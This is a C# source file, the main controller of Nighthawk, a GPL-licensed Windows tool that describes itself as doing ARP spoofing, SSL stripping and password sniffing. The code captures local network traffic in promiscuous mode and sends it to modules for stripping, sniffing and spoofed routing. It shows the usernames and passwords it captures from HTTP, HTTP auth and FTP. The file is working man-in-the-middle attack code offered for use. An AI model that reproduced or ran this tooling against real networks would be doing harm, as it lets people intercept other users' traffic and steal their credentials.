using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Windows;
using System.Windows.Documents;
using System.Windows.Media;
using PacketDotNet;
using SharpPcap;
using SharpPcap.WinPcap;

/**
Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
Copyright (C) 2010  Klemen Bratec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
namespace Nighthawk
{
    public class Main
    {
        // our network interface
        public WinPcapDevice Device;

        // list of devices (DeviceInfo)
        public List<DeviceInfo> DeviceInfoList = new List<DeviceInfo>();
        private DeviceInfo deviceInfo;

        // GUI
        public MainWindow Window;

        // modules
        public Sniffer Sniffer;
        public ARPTools ARPTools;
        public SSLStrip SSLStrip;
        public Scanner Scanner;

        // vendors (MAC OUI)
        public Dictionary<string, string> Vendors = new Dictionary<string, string>();

        // device status
        public bool Started;

        // last paragraph
        private string lastSSLText = string.Empty;

        // constructor
        public Main(MainWindow window)
        {
            Window = window;
        }

        // returns a collection of network interfaces
        public List<string> GetInterfaces()
        {
            var devices = new List<string>();

            // clear DeviceInfo list
            DeviceInfoList.Clear();

            // try to check for WinPcap???
            var error = false;

            try
            {
                var instance = WinPcapDeviceList.Instance[0];
                if (instance == null) error = true;
            } catch {
                error = true;
            }

            if(error) {
                MessageBox.Show("WinPcap not installed or no devices detected!", "Nighthawk error",
                            MessageBoxButton.OK, MessageBoxImage.Error);

                return new List<string>();
            }
            //

            foreach (var device in WinPcapDeviceList.Instance)
            {
                // get IPv4 address, subnet mask and broadcast address
                var address = "";
                var subnet = "";
                var broadcast = "";

                var address6 = "";
                var linkLocal = "";

                foreach (var addr in device.Addresses)
                {
                    if (addr.Addr.ipAddress != null)
                    {
                        // IPv4
                        if (addr.Addr.ipAddress.AddressFamily == AddressFamily.InterNetwork)
                        {
                            address = addr.Addr.ipAddress.ToString();
                            subnet = addr.Netmask.ipAddress.ToString();
                            broadcast = addr.Broadaddr.ipAddress.ToString();
                        }

                        // get last IPv6 AND link-local address
                        if (addr.Addr.ipAddress.AddressFamily == AddressFamily.InterNetworkV6)
                        {
                            if (!addr.Addr.ipAddress.IsIPv6LinkLocal)
                            {
                                address6 = addr.Addr.ipAddress.ToString();
                            }
                            else
                            {
                                linkLocal = addr.Addr.ipAddress.ToString();
                            }
                        }
                    }
                }

                // strip description
                var descriptionParts = device.Description.Split('\'');
                var description = descriptionParts[1];

                if (address != string.Empty && address != "0.0.0.0")
                {
                    DeviceInfoList.Add(new DeviceInfo { Device = device, CIDR = (int)Network.MaskToCIDR(subnet), IP = address, IPv6 = address6, LinkLocal = linkLocal, Mask = subnet, Broadcast = broadcast });
                    devices.Add(description + " (IPv4: " + address + "/" + Network.MaskToCIDR(subnet) + (address6 != string.Empty ? ", IPv6: " + address6 + ", " + linkLocal : "") + ")");
                }
                else
                {
                    DeviceInfoList.Add(new DeviceInfo { Device = device, IP = "0.0.0.0"});
                    devices.Add(description + " (IPv4: none" + (address6 != string.Empty ? ", IPv6: " + address6 + ", " + linkLocal : "") + ")");
                }

                // parse interface ID from WinPcap device "Name"
                var id = Regex.Split(device.Name, "NPF_")[1];

                // get and set mac address (DeviceInfo)
                foreach (var iface in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (iface.Id == id)
                    {
                        if(DeviceInfoList.Last() != null) DeviceInfoList.Last().PMAC = iface.GetPhysicalAddress();
                    }
                }
            }

            return devices;
        }

        // start listening on a device
        public void StartDevice(int deviceIndex)
        {
            Started = true;

            deviceInfo = DeviceInfoList[deviceIndex];
            Device = WinPcapDeviceList.Instance[deviceIndex];    

            // initialize modules
            Sniffer = new Sniffer(deviceInfo);
            ARPTools = new ARPTools(deviceInfo);
            SSLStrip = new SSLStrip(deviceInfo);
            Scanner = new Scanner(deviceInfo);

            // module events
            Sniffer.SnifferResult += new SnifferResultHandler(sniffer_OnSnifferResult);
            Scanner.ScannerResponse += new ScannerResponseReceived(scanner_OnResponse);
            Scanner.ScanComplete += new ScannerEventHandler(scanner_OnScanComplete);
            Scanner.HostnameResolved += new ScannerHostnameResolvedHandler(scanner_HostnameResolved);
            SSLStrip.SSLStripped += new SSLStripHandler(SSLStrip_OnSSLStripped);

            // open device, start capturing
            Device.Open(DeviceMode.Promiscuous, 1);
            Device.Filter = "(arp || ip || ip6)";
            Device.OnPacketArrival += new PacketArrivalEventHandler(device_OnPacketArrival);
            Device.StartCapture();
        }

        // stop listening on a device
        public void StopDevice()
        {
            Started = false;

            Device.StopCaptureTimeout = TimeSpan.FromMilliseconds(200);
            Device.StopCapture();
            Device.Close();
        }

        // OUI database loader
        public void LoadOUI()
        {
            string[] dbLines = File.ReadAllLines("OUI.txt");

            // parse every line and fill "Vendors"
            foreach (var line in dbLines)
            {
                if (!line.StartsWith("#") && line.Length > 5)
                {
                    var macSegment = line.Substring(0, 8).Replace("-", "");
                    var vendor = line.Substring(18, line.Length - 18);

                    if(!Vendors.ContainsKey(macSegment)) Vendors.Add(macSegment, vendor);
                }
            }
        }

        // check for Vendor
        private string GetVendorFromMAC(string mac)
        {
            var macSegment = mac.Substring(0, 6);

            if (Vendors.ContainsKey(macSegment)) return Vendors[macSegment];
            
            return "";
        }

        // packet arrival event
        private void device_OnPacketArrival(object sender, CaptureEventArgs e)
        {
            // parse packet
            Packet packet;

            try
            {
                packet = Packet.ParsePacket(e.Packet);
            }
            catch
            {
                return;
            }

            // check only ethernet packets
            if (packet is EthernetPacket)
            {
                // decode packet as TCP, ARP, IP
                var tcp = TcpPacket.GetEncapsulated(packet);
                var arp = ARPPacket.GetEncapsulated(packet);
                var ip = IpPacket.GetEncapsulated(packet);
                var icmpv6 = ICMPv6Packet.GetEncapsulated(packet);

                // ARP packet
                if (arp != null)
                {
                    if (Scanner.Started)
                    {
                        lock (Scanner.PacketQueueARP)
                        {
                            Scanner.PacketQueueARP.Add(arp);
                        }
                    }
                }

                // ICMPv6 packet
                if (icmpv6 != null)
                {
                    if (Scanner.Started)
                    {
                        lock (Scanner.PacketQueueNDP)
                        {
                            icmpv6.ParentPacket = ip;
                            icmpv6.ParentPacket.ParentPacket = packet;
                            Scanner.PacketQueueNDP.Add(icmpv6);
                        }
                    }
                }

                // TCP packet
                if (tcp != null)
                {
                    // if we are likely to have a HTTP/FTP packet (client -> server)
                    if (tcp.DestinationPort == 80 || tcp.DestinationPort == 21)
                    {
                        if (Sniffer.Started)
                        {
                            lock (Sniffer.PacketQueue)
                            {
                                Sniffer.PacketQueue.Add(tcp);
                            }
                        }
                    }

                    // SSL stripping needs in & out
                    if (tcp.DestinationPort == 80 || tcp.SourcePort == 80)
                    {
                        if (SSLStrip.Started)
                        {
                            if(!SSLStrip.ProcessPacket(packet, tcp)) return;
                        }
                    }
                }

                // IP packet (for routing)
                if (ip != null)
                {
                    // only route IPv4 when ARP spoofing active
                    if (ARPTools.SpoofingStarted && ip.SourceAddress.AddressFamily == AddressFamily.InterNetwork)
                    {
                        lock (ARPTools.PacketQueueRouting)
                        {
                            ARPTools.PacketQueueRouting.Add(packet);
                        }
                    }
                }
            }
        }

        /* Module events */
        private delegate void UI();

        // sniffer result (username/password sniffed)
        private void sniffer_OnSnifferResult(string url, string username, string password, string aditional, SnifferResultType type)
        {
            // update GUI text
            Window.Dispatcher.BeginInvoke(new UI(delegate
            {
                var brush = new SolidColorBrush();

                // brush color
                if (type == SnifferResultType.HTML)
                {
                    brush = new SolidColorBrush(Window.ColorSnifferHTML);
                }
                else if (type == SnifferResultType.HTTPAuth)
                {
                    brush = new SolidColorBrush(Window.ColorSnifferHTTPAuth);
                }
                else if (type == SnifferResultType.FTP)
                {
                    brush = new SolidColorBrush(Window.ColorSnifferFTP);
                }

                // create new result item
                var result = new SnifferResult { URL = url, Username = username, Password = password, Aditional = aditional, Type = type, ShapeBrush = brush};

                // don't repeat entries
                if (Window.SnifferResultList.Count == 0 || (Window.SnifferResultList.Last().CompareString() != result.CompareString()))
                {
                    Window.SnifferResultList.Add(result);
                }
            }));
        }

        // scanner response (new target)
        private void scanner_OnResponse(string ip, bool ipv6, PhysicalAddress mac, string hostname)
        {
            // update GUI
            Window.Dispatcher.Invoke(new UI(delegate
            {
                // check for existing MAC
                var items = Window.TargetList.Where(o => o.MAC.Replace(":", "") == mac.ToString());

                // add IP
                if (items.Count() > 0)
                {
                    var item = items.First();

                    if (ipv6 && (item.IPv6 == string.Empty || item.IPv6 == "/"))
                        item.IPv6 = ip;
                    else if (!ipv6)
                        item.IP = ip;
                }
                // add new item
                else
                {
                    var item = new Target { Hostname = hostname, MAC = Network.FriendlyPhysicalAddress(mac), PMAC = mac, Vendor = GetVendorFromMAC(mac.ToString()) };

                    if (ipv6)
                        item.IPv6 = ip;
                    else
                        item.IP = ip;
                   
                    // exclude local MAC)
                    if (mac.ToString() != deviceInfo.PMAC.ToString())
                    {
                        Window.TargetList.Add(item);
                        Window.TargetList.Sort();
                    }
                }
            }));
        }

        // network scan completed
        private void scanner_OnScanComplete()
        {
            // update GUI
            Window.Dispatcher.BeginInvoke(new UI(delegate
            {
                Window.BScanNetwork.IsEnabled = true;
                Window.BScanNetwork.Content = "Scan network";

                // check for target count to enable ARP spoofing buttons
                if (Window.TargetList.Count > 0)
                {
                    Window.BStartARP.IsEnabled = true;
                    // Window.BStartNDP.IsEnabled = true;
                }
            }));
        }


        // hostname resolved
        private void scanner_HostnameResolved(string ip, bool ipv6, string hostname)
        {
            if (Scanner.ResolveHostnames)
            {
                // update GUI
                Window.Dispatcher.BeginInvoke(new UI(delegate
                {
                    // check for local IP
                    if (ip != deviceInfo.IP)
                    {
                        var target = Window.TargetList.Where(t => t.IP == ip.ToString());
                        if(target.Count() > 0) target.First().Hostname = hostname;
                    }
                }));
            }
        }

        // SSL stripped
        private void SSLStrip_OnSSLStripped(string sourceIP, string destIP, List<string> changed)
        {
            // update GUI text
            Window.Dispatcher.BeginInvoke(new UI(delegate
            {
                // determine what has changed
                var changedText = string.Empty;

                foreach(var change in changed)
                {
                    if(change != changed.Last())
                    {
                        changedText += change + ", ";
                    } else {
                        changedText += change;
                    }
                }

                // build output string
                var text = "SSL stripped ("+ sourceIP +" -> "+ destIP +"): "+ changedText;
                var resultText = new Run(text);
                resultText.Foreground = new SolidColorBrush(Window.ColorSSLStrip);

                // change paragraph style
                var thickness = new Thickness(0, 0, 0, 5);
                var paragraph = new Paragraph(resultText);

                paragraph.Margin = thickness;

                // don't repeat entries
                if (lastSSLText != text)
                {
                    lastSSLText = text;

                    if(Window.TSSLText.Document.Blocks.Count > 0) {
                        Window.TSSLText.Document.Blocks.InsertBefore(Window.TSSLText.Document.Blocks.First(), paragraph);
                    } else {
                        Window.TSSLText.Document.Blocks.Add(paragraph);
                    }
                }
            }));
        }
    }
}
